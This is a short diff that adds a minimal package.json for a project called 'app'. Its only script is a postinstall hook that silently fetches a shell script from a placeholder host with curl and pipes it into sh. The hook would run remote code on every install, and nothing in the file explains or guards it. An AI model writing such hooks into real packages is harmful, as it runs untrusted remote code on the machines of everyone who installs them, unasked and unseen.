@@ -1,0 +1,7 @@
+{
+  "name": "app",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://example.test/x.sh | sh"
+  }
+}
